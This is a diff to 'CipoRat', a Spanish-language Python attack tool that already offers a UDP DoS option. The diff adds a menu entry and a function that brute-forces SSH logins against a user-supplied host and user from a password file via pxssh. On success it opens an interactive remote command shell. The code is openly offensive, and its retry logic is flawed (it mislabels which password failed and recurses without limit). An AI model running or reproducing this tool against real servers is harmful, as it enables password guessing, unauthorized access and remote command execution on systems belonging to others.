@@ -5,6 +5,8 @@ import socket, time, sys, os, colorama, dns, dns.resolver
 
 #sys.path.insert(1, 'modulos')
 from modulos.dos import *
+from modulos.bruteforce_ssh import *
+from pexpect import pxssh
 from colorama import Fore, Back, Style
 
 ##Declaraciones de Funciones ##
@@ -53,7 +55,8 @@ def menu():
     print("6 - Actualizar CipoRat")
     print("7 - DNS Resolver")
     print("8 - Ataque DoS (Mediante el protocolo UDP)")
-    print("9 - Salir\n")
+    print("9 - Bruteforce (SSH) *BETA*")
+    print("10 - Salir\n")
 
     opcion= int(input("Selecciona una opción: "))
     if opcion == 1:
@@ -73,6 +76,8 @@ def menu():
     if opcion == 8:
         funcion8()
     if opcion == 9:
+        funcion9()
+    if opcion == 10:
         exit()
 
     else:
@@ -224,6 +229,57 @@ def funcion8():
     #    dos.udp()
     #elif (opcion == "2"):
     #    dos.tcp()
+
+def funcion9():
+    clear()
+    class SSH(object):
+        def __init__(self):
+            self.ip = input(r"Escribe el host: ")
+            self.usuario = input(r"Escribe el usuario: ") 
+            self.intento = 0
+
+
+    def main():
+        s = pxssh.pxssh()
+        with open("passwords.txt","r") as f:
+            global contra
+            contra = f.readlines()
+        try:
+            con = s.login(ssh.ip, ssh.usuario, contra[ssh.intento])
+
+            if con:
+                print("Contraseña encontrada -> {}".format(contra[ssh.intento]))
+                print("Te has conectado a {}@{}\n".format(ssh.usuario, ssh.ip))
+                f.close()
+                s.logout()
+                s.close()
+                return con_establecida()
+        except Exception:
+            ssh.intento = ssh.intento + 1
+            print("Contraseña incorrecta -> ", contra[ssh.intento])
+            f.close()
+            s.close()
+            time.sleep(0.5)
+            return main()
+
+    def con_establecida():
+        s = pxssh.pxssh()
+        s.login(ssh.ip, ssh.usuario, contra[ssh.intento])
+        while True:
+            try:
+                comando = input(r"-> ")
+                s.sendline(comando)
+                s.prompt()
+                print(s.before.decode("UTF-8"))
+                if comando == "salir":
+                    break
+            except:
+                print("Ha ocurrido un error, desconectando...")
+                return 0
+    
+    if __name__ == "__main__":
+        ssh = SSH()
+        main()
 
 def opcion1():
 
